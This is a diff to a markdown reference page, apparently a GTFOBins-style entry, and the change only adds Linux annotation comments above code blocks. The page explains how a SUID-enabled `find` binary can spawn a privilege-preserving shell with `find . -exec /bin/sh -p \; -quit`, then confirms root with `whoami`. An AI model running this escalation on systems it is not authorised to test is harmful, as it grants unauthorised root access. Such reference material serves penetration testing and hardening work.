@@ -17,11 +17,13 @@ The `find` utility, if granted the SUID bit, can execute commands with the privi
 
 Execute `find` on any file (e.g., `.`) and pass `/bin/sh -p` to the `-exec` argument. The `-p` flag is critical as it instructs the shell to preserve the effective UID (SUID), preventing it from dropping privileges.
 
+<!-- cmd: linux -->
 ```bash
 find . -exec /bin/sh -p \; -quit
 ```
 
 Verify your privileges:
+<!-- cmd: linux -->
 ```bash
 whoami
 # Should return root or the SUID owner
